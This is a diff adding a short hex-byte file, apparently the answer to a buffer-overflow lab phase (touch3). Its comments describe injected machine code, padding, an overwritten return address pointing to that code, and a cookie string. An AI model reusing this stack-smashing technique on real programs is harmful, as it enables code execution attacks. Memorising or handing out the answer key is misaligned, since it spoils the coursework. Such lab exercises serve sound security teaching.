@@ -1,0 +1,8 @@
+48 c7 c7 a8 dc 61 55 68 /* move cookie string address(rsp + 48 the address where the cookie is presen) to rdi, push address of touch3 */
+fa 18 40 00 c3 00 00 00 /* return */
+00 00 00 00 00 00 00 00 /* padding */
+00 00 00 00 00 00 00 00 /* padding */
+00 00 00 00 00 00 00 00 /* padding */
+78 dc 61 55 00 00 00 00 /* address of expolit code */
+35 39 62 39 39 37 66 61 /* cookie string */
+00 00 00 00 00 00 00 00 /* '\0' terminates the string, also padding */
